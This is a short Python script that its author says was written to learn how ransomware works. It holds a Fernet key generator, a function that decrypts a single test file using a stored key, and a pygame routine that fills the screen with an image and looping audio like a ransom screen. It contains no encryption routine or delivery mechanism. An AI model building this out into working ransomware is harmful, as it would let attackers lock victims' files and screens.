#This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 
import pygame
import os
from cryptography.fernet import Fernet 

key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT 

def decrypt():
   input("decrypt?")
   #read file key 
   with open("KEY") as file_key:
      key_to_decrypt = file_key.read()
      
   decryptor = Fernet(key_to_decrypt)

   #read encrypted data
   with open("prueba.txt","rb") as f:
      encrypted_data = f.read()
      original_data = decryptor.decrypt(encrypted_data)
    #restore
   with open("prueba.txt","wb") as restored_file:
      restored_file.write(original_data)
   
  
def fazwin():
    pygame.init() #init pygame
    pygame.mixer.init() #init pygame audio module
 # create window
    wind = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    pygame.display.set_caption("")
 #load img and music
    fazbear_img = pygame.image.load("./assets/img.jpg")
    pygame.mixer.music.load("./assets/aud.mp3")
    pygame.mixer.music.play(-1)
    execute_win = True
    # window loop
    while execute_win:
        for x in pygame.event.get():
            if x.type == pygame.QUIT:
                execute_win = False
     #load window
        wind.fill((0, 0, 0)) 
        wind.blit(fazbear_img, (0, 0))
        pygame.display.flip()
    pygame.quit()


